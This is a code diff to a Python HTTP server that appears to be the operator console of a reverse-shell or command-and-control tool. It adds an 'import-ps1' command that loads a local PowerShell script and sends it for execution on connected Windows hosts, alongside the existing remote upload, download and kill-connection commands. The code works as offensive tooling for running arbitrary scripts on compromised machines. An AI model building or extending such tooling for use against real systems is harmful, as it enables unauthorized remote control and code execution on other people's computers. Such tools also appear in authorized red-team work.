@@ -181,10 +181,28 @@ class MyServer(BaseHTTPRequestHandler):
                             command = "download " + args[1] + "!" + args[2]
                             print(colored(f"[+] Downloading {remote_path} in {local_path}..\n","green"))
 
+                    if "import-ps1" in command.split()[0]:
+                        args = oslex.split(command)
+                        if len(args) < 2 or len(args) > 2:
+                            print(colored("[!] Usage: import-ps1 /path/script.ps1\n", "red"))
+                            continue 
+                        
+                        else:  
+                            try:
+                                filename = args[1]
+                                with open(filename, "rb") as f:
+                                    command = f.read().decode()
+                                    print(colored(f"[!] File {filename} imported successfully!", "green"))
+
+                            except FileNotFoundError:
+                                print(colored(f"[!] File \"{filename}\" not found!\n", "red"))
+                                command = None
+
                     if "help" in command.split()[0]:
                         print(colored("[+] Available commands:","green"))
                         print(colored("    upload: Upload a file from local to remote computer","blue"))
                         print(colored("    download: Download a file from remote to local computer","blue"))
+                        print(colored("    import-ps1: Import PowerShell script on Windows hosts","blue"))
                         print(colored("    clear/cls: Clear terminal screen","blue"))
                         print(colored("    kill: Kill client connection","blue"))
                         print(colored("    exit: Exit from program\n","blue"))
